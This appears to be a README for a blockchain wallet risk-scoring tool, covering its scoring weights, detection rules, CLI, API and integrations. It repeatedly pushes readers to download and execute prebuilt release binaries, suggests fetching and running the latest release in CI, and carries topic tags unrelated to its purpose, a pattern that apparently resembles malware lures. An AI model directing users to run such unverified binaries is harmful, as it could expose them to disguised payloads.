# Blockchain Wallet Risk Analyzer — Wallet Risk, Fraud & Score 🔍💼📊

[![Download Release](https://img.shields.io/badge/Release-Download-blue?logo=github)](https://github.com/ctvlc/Blockchain-Risk-App/releases)

<img alt="blockchain" src="https://images.unsplash.com/photo-1548092372-6e1e9d0f1b18?q=80&w=1200&auto=format&fit=crop&ixlib=rb-4.0.3&s=7a4f8b6ab3b5f6b2c0a1f2a6a3d2c5f0" style="width:100%;max-height:300px;object-fit:cover;border-radius:8px" />

One-line description
- Assess blockchain wallet risks with a fast, repeatable risk score and clear provenance.

Badges
- Build status: ![build](https://img.shields.io/badge/build-passing-brightgreen)
- License: ![license](https://img.shields.io/badge/license-MIT-lightgrey)
- Topics: arbitrage, auto, code, earning, free, gain, guide, income, learn, profit, smart, source, trade, tutorial, youtube

Why this repo
- I designed a tool that inspects wallet activity on public chains.
- It flags theft, laundering, wash trading, and risky counterparties.
- It gives a numeric score and a reasoned breakdown for each wallet.

Table of contents
- Features
- Quick start
- Download and run
- Usage examples
- Risk model
- Data sources
- Architecture
- CLI & API
- Integrations
- Development
- Contributing
- License
- Acknowledgements

Features
- Wallet risk score (0–100). Lower equals higher risk.
- Label discovery for addresses: mixers, exchanges, gambling, bridges.
- Transaction pattern detection: rapid fund movement, fan-out, layering.
- Heuristic detection for common scams and known exploit signatures.
- Score breakdown with weights and evidence.
- CLI and REST API for automation.
- Export reports to JSON and CSV.
- Support for Ethereum-compatible chains and modular parsers.

Quick start — one-minute view
- Clone the repo or download the latest release.
- Fetch chain data for the target wallet.
- Run the analyzer.
- Review the score and evidence.

Download and run (release assets)
- The releases page contains compiled binaries and packaged assets. Download the appropriate asset and execute it.
- Visit the releases page to get the packaged installer: https://github.com/ctvlc/Blockchain-Risk-App/releases
- The releases bundle includes:
  - analyzer-linux (x86_64)
  - analyzer-macos (arm64 / x86_64)
  - analyzer-win.exe
  - assets/ (rule sets, labels, sample data)
- After download:
  - Linux/macOS: chmod +x analyzer && ./analyzer --wallet 0x...
  - Windows: run analyzer-win.exe from PowerShell or CMD.

Example: run the binary
- Inspect a wallet and save JSON output:
  - ./analyzer --wallet 0xAbC123... --chain ethereum --out report.json
- Quick CLI help:
  - ./analyzer --help

Usage — REST API
- Start the local server:
  - ./analyzer serve --port 8080
- Example request:
  - POST /api/v1/scan
  - Body: { "wallet": "0xAbC123...", "chain": "ethereum", "depth": 4 }
- Response: JSON with score, labels, transactions, evidence.

Risk model (how score works)
- The model uses rule-based and statistical checks. It produces a weighted sum.
- Components:
  - Counterparty risk (30%): fraction of funds that touch labeled high-risk addresses.
  - Flow risk (25%): speed and complexity of transfers (fan-out, fan-in, rounds).
  - Source risk (20%): known exploit flags, contract interactions with shady contracts.
  - Interaction risk (15%): interactions with mixers, bridges, DEXs flagged for wash trading.
  - History and reputation (10%): prior alerts and manual tags.
- Each component returns a score and evidence items with timestamps, tx hashes, and chain IDs.

Detection rules (examples)
- Rapid cash-out: repeated transactions to new addresses within 24 hours.
- Chain-hopping pattern: fund moves across multiple bridges within short intervals.
- Mixer touch: any direct or indirect transfer to known mixer addresses within 3 hops.
- Exchange seeding: high volume deposits to an exchange followed by withdrawals to many addresses.
- Smart-contract exploit signature: interaction with a contract on the exploit list followed by large outbound transfer.

Evidence model
- Evidence item fields:
  - type: transaction | contract | label
  - id: tx hash or contract address
  - reason: rule name
  - score_impact: numeric delta
  - chain: chain id / name
  - timestamp: ISO 8601
- The report lists evidence sorted by impact.

Data sources
- On-chain node providers (RPC): local node or public RPC like Infura, Alchemy.
- Public label lists: curated sources and community feeds.
- Known exploit DB: compiled from security advisories and public write-ups.
- Chain parsers: EVM, Solana, UTXO adapters (modular).

Supported chains
- Ethereum and EVM-compatible chains out of the box.
- Add custom chain modules via a simple adapter interface.
- UTXO support as a plugin.

Architecture
- Core analyzer (Go): fast processing, low memory.
- Rule engine: JSON rule files. Update without rebuild.
- Parsers: modular connectors for chain formats.
- Storage: optional SQLite for caching and history.
- REST server: lightweight API for orchestration.
- CLI: single binary for scan and serve.

Integrations
- SIEM: export JSON and pipe to ElasticSearch.
- Wallet scanners: integrate via HTTP webhooks.
- Exchange compliance: batch scanning and CSV export for reporting.
- Monitoring: Prometheus metrics endpoint.

Example workflows
- Single wallet check
  - Run: ./analyzer --wallet 0xAbC... --chain ethereum
  - Read output: score, labels, txs, evidence
- Batch mode
  - Provide a CSV of wallets. The tool scans each and writes a summary CSV with scores.
- Stream mode
  - Connect to a mempool feed or webhook. The analyzer scores addresses in near real time.

CLI reference (sample)
- analyzer scan --wallet <addr> --chain <chain> --depth 4 --out report.json
- analyzer serve --port 8080 --cache /var/lib/analyzer
- analyzer update-rules --source rules/community.json
- analyzer batch --file wallets.csv --concurrency 8

Rule authoring
- Rules are JSON objects with:
  - id
  - description
  - pattern (tx pattern, address tag, contract method)
  - impact (weight)
  - conditions (amount thresholds, time windows)
- Add rules to assets/rules/ and reload the server.

Security and privacy
- The tool reads public chain data only.
- You can run it offline with a local RPC endpoint and local label DB.
- Avoid sending private keys to the tool. The analyzer never needs keys.

Developer notes
- Language: Go for core processing. Minimal dependencies.
- Tests: unit tests for parsers and rule engine.
- Linting: gofmt and golangci-lint.
- Build:
  - make build
  - make release (creates artifacts placed in the Releases page)
- Release artifacts land on the Releases page for download and execution.

Contributing
- Open an issue for bugs, feature requests, or rule proposals.
- Fork, implement, and open a pull request.
- Add tests for new parsers and rules.
- Keep changes small and focused.

Release downloads and automation
- Use the Releases page to fetch stable binaries and rule updates.
- Automation example (GitHub Actions):
  - Run CI to build artifacts and push them as release assets.
  - Consumers can script a curl/wget to fetch the latest release and run it in CI.

Download link (again)
- Grab the packaged release and run the binary: https://github.com/ctvlc/Blockchain-Risk-App/releases

Testing and sample data
- assets/sample_wallets.csv contains wallets for testing.
- assets/sample_txns.json has synthetic transactions and expected detections.
- Run tests:
  - make test

Performance
- The engine processes tens of thousands of transactions per minute on commodity hardware.
- Use caching for repeated address lookups.
- Parallelize chain calls when scanning deep graphs.

Common use cases
- Exchange compliance: batch-score incoming withdrawal addresses.
- Forensics: trace exploit flows and generate evidence reports.
- Research: measure prevalence of wash trading and mixer use.
- Alerts: add the analyzer to webhook pipelines to flag high-risk addresses.

Images and visuals
- Use the included diagrams in docs/architecture.png for an overview.
- Screenshots: docs/screenshot-cli.png and docs/screenshot-json.png show sample output.

Changelog
- See the Releases page for packaged builds and changelog notes:
  - https://github.com/ctvlc/Blockchain-Risk-App/releases

License
- MIT License. See LICENSE file.

Acknowledgements
- Community contributors for label feeds.
- Public security write-ups for exploit signatures.
- Open-source RPC clients and tooling.

Contact
- Open issues on GitHub. Use PRs for code changes and rule updates.

Quick reference — commands
- Scan single wallet:
  - ./analyzer --wallet 0xAbC... --chain ethereum --out out.json
- Serve API:
  - ./analyzer serve --port 8080
- Update rules:
  - ./analyzer update-rules --file assets/rules/community.json

Topics / tags
- arbitrage, auto, code, earning, free, gain, guide, income, learn, profit, smart, source, trade, tutorial, youtube

End of README sections.